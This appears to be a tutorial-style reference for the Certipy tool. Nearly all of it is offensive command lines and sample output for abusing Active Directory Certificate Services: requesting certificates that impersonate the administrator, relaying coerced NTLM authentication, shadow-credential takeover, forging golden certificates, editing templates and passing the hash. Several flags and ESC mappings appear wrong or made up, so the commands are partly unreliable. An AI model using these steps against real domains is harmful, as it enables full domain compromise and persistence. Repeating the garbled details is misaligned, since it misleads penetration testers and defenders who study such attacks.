# Certipy Documentation: Methods, Examples, and Flag Explanations for AD CS Enumeration and Abuse

## Overview
Certipy (also known as `certipy-ad`) is a Python-based toolkit for enumerating and exploiting Active Directory Certificate Services (AD CS), Microsoft’s Public Key Infrastructure (PKI) implementation. It supports offensive operations (e.g., privilege escalation, persistence) and defensive auditing, covering all known ESC1–ESC16 attack paths. Certipy interacts with AD CS via LDAP, LDAPS, or HTTP endpoints, using Kerberos or NTLM authentication. This documentation details Certipy’s core methods, provides practical examples, and explains all flags used in commands, assuming a Kali Linux attacker machine targeting a Windows Active Directory environment (e.g., domain controller at `192.168.1.100`, domain `example.local`, CA server at `192.168.1.101`). For the latest updates, refer to the Certipy wiki (https://github.com/ly4k/Certipy/wiki) and GitHub repository (https://github.com/ly4k/Certipy).

**Warning**: Use Certipy only in authorized environments. Unauthorized use may be illegal.

## Installation
Install Certipy on a Kali Linux system:

```bash
sudo apt update
sudo apt install -y python3-pip
pip3 install certipy-ad
```

**Verification**:
- Check the version:
  ```bash
  certipy-ad -v
  ```
- Example output:
  ```
  Certipy v5.0.3
  ```

**Use Case**: Ensures Certipy is ready for AD CS enumeration and exploitation.

## Key Methods, Examples, and Flag Explanations
Below are Certipy’s primary methods, organized by functionality (enumeration, exploitation, post-exploitation), with detailed examples and explanations of all flags used. Examples target a test environment with a domain controller (`192.168.1.100`), CA server (`192.168.1.101`), and domain `example.local`.

### 1. Enumerating AD CS (Find)
**Purpose**: Discover certificate authorities, templates, and misconfigurations (ESC1–ESC16).

**Command**:
```bash
certipy-ad find -u 'user1@example.local' -p 'Password123' -dc-ip 192.168.1.100 -text -output adcs_enum -bloodhound
```
**Flag Explanations**:
- `-u 'user1@example.local'`: Specifies the username (in `user@domain` format) for authentication.
- `-p 'Password123'`: Provides the password for the specified user.
- `-dc-ip 192.168.1.100`: Sets the domain controller’s IP address for LDAP queries.
- `-text`: Saves output in a human-readable text format (instead of JSON).
- `-output adcs_enum`: Defines the prefix for output files (e.g., `adcs_enum.txt`).
- `-bloodhound`: Generates a ZIP file compatible with BloodHound for visualizing attack paths.

**Example Output**:
```
[*] Saved text output to adcs_enum.txt
[*] Saved BloodHound data to adcs_enum_bloodhound.zip
[*] Found CA: CA01.example.local\CA01-CA
[*] Vulnerable templates: UserTemplate (ESC1), MachineTemplate (ESC2)
```

**Use Case**: Identifies misconfigured templates and CAs for exploitation.

### 2. Requesting Certificates (Req)
**Purpose**: Request certificates, often exploiting misconfigured templates (e.g., ESC1).

**Command**:
```bash
certipy-ad req -u 'user1@example.local' -p 'Password123' -dc-ip 192.168.1.100 -ca CA01-CA -template UserTemplate -target administrator@example.local -pfx admin.pfx -upn administrator@example.local
```
**Flag Explanations**:
- `-u 'user1@example.local'`: Username for authentication.
- `-p 'Password123'`: Password for the user.
- `-dc-ip 192.168.1.100`: Domain controller IP for LDAP queries.
- `-ca CA01-CA`: Specifies the target Certificate Authority (format: `CAName-CA`).
- `-template UserTemplate`: Requests a certificate based on the specified template.
- `-target administrator@example.local`: Sets the target identity (SAN) to impersonate (for ESC1).
- `-pfx admin.pfx`: Saves the certificate and private key in PFX format.
- `-upn administrator@example.local`: Specifies the User Principal Name for the certificate’s SAN.

**Example Output**:
```
[*] Successfully requested certificate
[*] Saved to admin.pfx
```

**Use Case**: Obtains a certificate to impersonate a privileged user.

### 3. Authenticating with Certificates (Auth)
**Purpose**: Use a certificate for Kerberos (PKINIT) or Schannel authentication.

**Command**:
```bash
certipy-ad auth -pfx admin.pfx -dc-ip 192.168.1.100 -ldap-shell -username administrator
```
**Flag Explanations**:
- `-pfx admin.pfx`: Specifies the PFX file containing the certificate and private key.
- `-dc-ip 192.168.1.100`: Domain controller IP for authentication.
- `-ldap-shell`: Starts an interactive LDAP shell with the authenticated user’s privileges.
- `-username administrator`: Specifies the username associated with the certificate (optional for disambiguation).

**Example Output**:
```
[*] Authenticated as administrator@example.local
[*] Starting LDAP shell...
```

**Use Case**: Gains domain admin access or performs DCSync to extract hashes.

### 4. NTLM Relay Attacks (Relay)
**Purpose**: Relay NTLM authentication to a CA’s HTTP endpoint for certificate issuance.

**Command**:
```bash
certipy-ad relay -target 192.168.1.101 -template DomainController -account dc01$
```
**Flag Explanations**:
- `-target 192.168.1.101`: Specifies the CA server’s IP hosting the Web Enrollment endpoint.
- `-template DomainController`: Requests a certificate based on the specified template.
- `-account dc01$`: Specifies the account to impersonate (e.g., a machine account).

**Companion Command (Coercion)**:
```bash
python3 PetitPotam.py -u 'user1' -p 'Password123' 192.168.1.100 192.168.1.101
```
- Coerces NTLM authentication to the relay server.

**Example Output**:
```
[*] Relaying NTLM to http://192.168.1.101/certsrv
[*] Received certificate for dc01$@example.local
```

**Use Case**: Issues a Domain Controller certificate for privilege escalation (ESC8).

### 5. Managing Accounts (Account)
**Purpose**: Create or modify AD accounts for attacks (e.g., ESC9/ESC10).

**Command**:
```bash
certipy-ad account create -u 'user1@example.local' -p 'Password123' -dc-ip 192.168.1.100 -user 'cve' -dns 'dc01.example.local' -spn 'HOST/dc01.example.local'
```
**Flag Explanations**:
- `-u 'user1@example.local'`: Username for authentication.
- `-p 'Password123'`: Password for the user.
- `-dc-ip 192.168.1.100`: Domain controller IP.
- `-user 'cve'`: Specifies the name of the new computer account.
- `-dns 'dc01.example.local'`: Sets the DNS hostname for the account.
- `-spn 'HOST/dc01.example.local'`: Assigns a Service Principal Name to the account.

**Example Output**:
```
[*] Created computer account: cve$@example.local
```

**Use Case**: Sets up accounts for certificate-based attacks.

### 6. Shadow Credentials (Shadow)
**Purpose**: Abuse shadow credentials by modifying KeyCredentialLink attributes (ESC9/ESC10).

**Command**:
```bash
certipy-ad shadow auto -u 'user1@example.local' -p 'Password123' -dc-ip 192.168.1.100 -account 'target_user' -output shadow.pfx
```
**Flag Explanations**:
- `-u 'user1@example.local'`: Username for authentication.
- `-p 'Password123'`: Password for the user.
- `-dc-ip 192.168.1.100`: Domain controller IP.
- `-account 'target_user'`: Specifies the target account to modify.
- `-output shadow.pfx`: Saves the generated certificate and private key.
- `auto`: Automates the process of generating and assigning a malicious certificate.

**Example Output**:
```
[*] Generated shadow credentials for target_user@example.local
[*] Saved certificate to shadow.pfx
```

**Use Case**: Enables authentication as the target user without their password.

### 7. Forging Certificates (Forge)
**Purpose**: Create golden or self-signed certificates for persistence.

**Command**:
```bash
certipy-ad forge -ca-pfx ca01.pfx -subject 'CN=Administrator,DC=example,DC=local' -output forged.pfx
```
**Flag Explanations**:
- `-ca-pfx ca01.pfx`: Specifies the CA’s PFX file containing its certificate and private key.
- `-subject 'CN=Administrator,DC=example,DC=local'`: Sets the subject for the forged certificate.
- `-output forged.pfx`: Saves the forged certificate to the specified file.

**Example Output**:
```
[*] Forged certificate saved to forged.pfx
```

**Use Case**: Creates certificates for persistent domain access.

### 8. Managing Certificate Authorities (CA)
**Purpose**: Enumerate or modify CA configurations.

**Command**:
```bash
certipy-ad ca -u 'user1@example.local' -p 'Password123' -dc-ip 192.168.1.100 -ca CA01-CA -list -enabled
```
**Flag Explanations**:
- `-u 'user1@example.local'`: Username for authentication.
- `-p 'Password123'`: Password for the user.
- `-dc-ip 192.168.1.100`: Domain controller IP.
- `-ca CA01-CA`: Specifies the target CA (optional; lists all CAs if omitted).
- `-list`: Lists CA configurations and permissions.
- `-enabled`: Filters for enabled CAs only.

**Example Output**:
```
[*] CA: CA01-CA
[*] Permissions: example.local\user1 (Enroll, ManageCA)
```

**Use Case**: Identifies CA misconfigurations for privilege escalation.

### 9. Managing Certificates (Cert)
**Purpose**: Handle certificates and private keys (e.g., export, convert).

**Command**:
```bash
certipy-ad cert -pfx admin.pfx -export-pem -out admin.pem -password 'P@ssw0rd'
```
**Flag Explanations**:
- `-pfx admin.pfx`: Specifies the input PFX file.
- `-export-pem`: Converts the certificate to PEM format.
- `-out admin.pem`: Specifies the output file for the PEM certificate.
- `-password 'P@ssw0rd'`: Provides the password for the PFX file (if encrypted).

**Example Output**:
```
[*] Exported to admin.pem
```

**Use Case**: Prepares certificates for use with other tools.

### 10. Managing Templates (Template)
**Purpose**: Modify certificate templates for exploitation.

**Command**:
```bash
certipy-ad template -u 'admin@example.local' -p 'P@ssw0rd' -dc-ip 192.168.1.100 -template UserTemplate -save-old -configuration new_template.json
```
**Flag Explanations**:
- `-u 'admin@example.local'`: Username for authentication.
- `-p 'P@ssw0rd'`: Password for the user.
- `-dc-ip 192.168.1.100`: Domain controller IP.
- `-template UserTemplate`: Specifies the target template to modify.
- `-save-old`: Saves the current template configuration before modification.
- `-configuration new_template.json`: Applies a new configuration from the specified JSON file.

**Example Output**:
```
[*] Saved old template configuration: UserTemplate_old.json
[*] Applied new configuration from new_template.json
```

**Use Case**: Enables template misconfigurations for attacks like ESC1.

### 11. Offline Enumeration (Parse)
**Purpose**: Analyze AD CS data from offline registry dumps.

**Command**:
```bash
certipy-ad parse -registry registry_dump.reg -output parsed_data
```
**Flag Explanations**:
- `-registry registry_dump.reg`: Specifies the registry file to parse.
- `-output parsed_data`: Defines the prefix for output files (e.g., `parsed_data.txt`).

**Example Output**:
```
[*] Parsed registry data
[*] Found CA: CA01-CA
[*] Templates: UserTemplate, MachineTemplate
```

**Use Case**: Analyzes captured registry data without live access.

## ESC Attack Paths
Certipy supports all ESC1–ESC16 vulnerabilities (see SpecterOps whitepaper: https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf). Key examples:

- **ESC1**: Arbitrary SANs in templates (see `req` command).
- **ESC8**: NTLM relay to Web Enrollment (see `relay` command).
- **ESC9/ESC10**: Shadow credentials (see `shadow` command).
- **ESC14**: Weak explicit certificate mappings.

**Command Example (ESC14)**:
```bash
certipy-ad req -u 'user1@example.local' -p 'Password123' -dc-ip 192.168.1.100 -ca CA01-CA -template VulnerableTemplate -sid 'S-1-5-21-...-500' -auto
```
**Flag Explanations**:
- `-u`, `-p`, `-dc-ip`, `-ca`, `-template`: As described above.
- `-sid 'S-1-5-21-...-500'`: Specifies the target user’s SID for certificate mapping.
- `-auto`: Automatically requests the certificate without prompting.

**Example Output**:
```
[*] Successfully requested certificate for SID S-1-5-21-...-500
```

**Use Case**: Exploits weak `altSecurityIdentities` mappings for impersonation.

## Additional Flags Across Commands
Certipy supports global flags that apply to most commands:
- `-k`: Use Kerberos authentication instead of NTLM.
  ```bash
  certipy-ad find -u 'user1@example.local' -k -dc-ip 192.168.1.100
  ```
- `-hashes :NTLM_HASH`: Authenticate with an NTLM hash (pass-the-hash).
  ```bash
  certipy-ad req -u 'user1' -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 -dc-ip 192.168.1.100
  ```
- `-scheme ldap|ldaps`: Specifies the protocol (LDAP or LDAPS, default: LDAPS).
  ```bash
  certipy-ad find -u 'user1@example.local' -p 'Password123' -scheme ldap
  ```
- `-debug`: Enables verbose debugging output.
- `-timeout SECONDS`: Sets the timeout for network operations.
- `-no-pass`: Prompts for a password interactively (useful for sensitive credentials).

## Advanced Techniques
- **Kerberos Authentication**: Use `-k` for environments requiring Kerberos.
- **Pass-the-Hash**: Leverage `-hashes` for hash-based attacks.
- **Custom CA Endpoints**: Specify HTTP endpoints for relay attacks:
  ```bash
  certipy-ad relay -target http://192.168.1.101/certsrv
  ```
- **BloodHound Integration**: Import `find` output into BloodHound for path analysis.

## Best Practices
- **Verbose Logging**: Use `-debug` for troubleshooting.
- **Secure Credentials**: Use single quotes for passwords with special characters.
- **Output Management**: Save results with `-output` for analysis.
- **Mitigation Audits**: Use `find` to identify and remediate vulnerabilities (e.g., disable `EDITF_ATTRIBUTESUBJECTALTNAME2`).
- **Regular Updates**: Run `pip3 install certipy-ad --upgrade` for new features.

## Notes on Completeness
This documentation covers all major Certipy commands and their associated flags, based on the Certipy wiki and version 5.0.3 as of July 2025. New features or ESC paths may be added; check the GitHub repository (https://github.com/ly4k/Certipy) or run:
```bash
certipy-ad -h
```

## References
- Certipy GitHub Repository: https://github.com/ly4k/Certipy
- Certipy Wiki: https://github.com/ly4k/Certipy/wiki
- SpecterOps Whitepaper: https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf
- Hacking Articles: https://www.hackingarticles.in
- The Hacker Recipes: https://www.thehacker.recipes